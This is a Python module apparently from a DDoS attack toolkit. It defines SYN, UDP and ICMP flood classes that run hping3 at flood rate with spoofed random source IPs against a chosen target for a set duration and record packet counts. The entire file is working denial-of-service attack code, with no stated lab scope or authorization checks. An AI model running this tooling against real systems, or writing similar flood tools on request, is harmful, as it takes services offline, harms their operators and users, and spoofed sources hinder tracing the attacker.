"""
Layer 3/4 DDoS Attacks
SYN Flood, UDP Flood, ICMP Flood
"""

import subprocess
import time
from .base import AttackBase
from .utils import check_tool_installed


class SYNFlood(AttackBase):
    """
    SYN Flood Attack - TCP SYN packets without completing handshake
    
    Realistic implementation using hping3 with random source IPs
    """
    
    def execute(self, duration: int, rate: str = 'flood', **kwargs) -> bool:
        """
        Execute SYN flood attack
        
        Args:
            duration: Attack duration in seconds
            rate: 'flood' for max rate, or number for packets/sec
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting SYN FLOOD on {self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Rate: {rate}')
        
        if not check_tool_installed('hping3'):
            self.log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        # Build command
        rate_flag = '--flood' if rate == 'flood' else f'-i u{1000000//int(rate)}'
        cmd = [
            'hping3',
            '-S',  # SYN flag
            rate_flag,
            '-p', str(self.port),
            '--rand-source',  # Random source IP (critical for realism)
            self.target
        ]
        
        try:
            self.start()
            
            # Run attack
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Monitor for duration
            time.sleep(duration)
            proc.terminate()
            
            # Try to get stats from hping3 output
            try:
                proc.wait(timeout=2)
                output = proc.stderr.read()
                # Parse hping3 output for packet count
                # Format: "--- hping statistic --- X packets transmitted"
                if 'packets transmitted' in output:
                    parts = output.split('packets transmitted')[0].split()
                    if parts:
                        self.stats['packets_sent'] = int(parts[-1])
            except:
                pass
            
            self.stop()
            self.log('SUCCESS', '✓ SYN flood completed')
            return True
            
        except Exception as e:
            self.log('ERROR', f'SYN flood failed: {str(e)}')
            self.stop()
            return False


class UDPFlood(AttackBase):
    """
    UDP Flood Attack - Massive UDP packet flood
    
    Can be used for:
    - Direct UDP flood
    - UDP amplification preparation
    - Testing UDP-based services
    """
    
    def execute(self, duration: int, rate: str = 'flood', data_size: int = 120, **kwargs) -> bool:
        """
        Execute UDP flood attack
        
        Args:
            duration: Attack duration in seconds
            rate: 'flood' for max rate, or number for packets/sec
            data_size: Payload size in bytes
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting UDP FLOOD on {self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Rate: {rate} | Size: {data_size}B')
        
        if not check_tool_installed('hping3'):
            self.log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        rate_flag = '--flood' if rate == 'flood' else f'-i u{1000000//int(rate)}'
        cmd = [
            'hping3',
            '--udp',
            rate_flag,
            '-p', str(self.port),
            '-d', str(data_size),  # Data size
            '--rand-source',
            self.target
        ]
        
        try:
            self.start()
            
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            proc.terminate()
            
            # Parse stats
            try:
                proc.wait(timeout=2)
                output = proc.stderr.read()
                if 'packets transmitted' in output:
                    parts = output.split('packets transmitted')[0].split()
                    if parts:
                        packets = int(parts[-1])
                        self.stats['packets_sent'] = packets
                        self.stats['bytes_sent'] = packets * data_size
            except:
                pass
            
            self.stop()
            self.log('SUCCESS', '✓ UDP flood completed')
            return True
            
        except Exception as e:
            self.log('ERROR', f'UDP flood failed: {str(e)}')
            self.stop()
            return False


class ICMPFlood(AttackBase):
    """
    ICMP Flood Attack (Ping Flood / Ping of Death)
    
    Improved version with configurable packet size for Ping of Death
    """
    
    def execute(self, duration: int, packet_size: int = 65500, **kwargs) -> bool:
        """
        Execute ICMP flood attack
        
        Args:
            duration: Attack duration in seconds
            packet_size: ICMP packet size (default: 65500 for Ping of Death)
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting ICMP FLOOD on {self.target}')
        self.log('INFO', f'Duration: {duration}s | Packet size: {packet_size}B')
        
        if not check_tool_installed('hping3'):
            self.log('ERROR', 'hping3 not installed. Install: sudo apt install hping3')
            return False
        
        cmd = [
            'hping3',
            '--icmp',
            '--flood',
            '-d', str(packet_size),  # Large packet for Ping of Death
            '--rand-source',
            self.target
        ]
        
        try:
            self.start()
            
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            proc.terminate()
            
            # Parse stats
            try:
                proc.wait(timeout=2)
                output = proc.stderr.read()
                if 'packets transmitted' in output:
                    parts = output.split('packets transmitted')[0].split()
                    if parts:
                        packets = int(parts[-1])
                        self.stats['packets_sent'] = packets
                        self.stats['bytes_sent'] = packets * packet_size
            except:
                pass
            
            self.stop()
            self.log('SUCCESS', '✓ ICMP flood completed')
            return True
            
        except Exception as e:
            self.log('ERROR', f'ICMP flood failed: {str(e)}')
            self.stop()
            return False
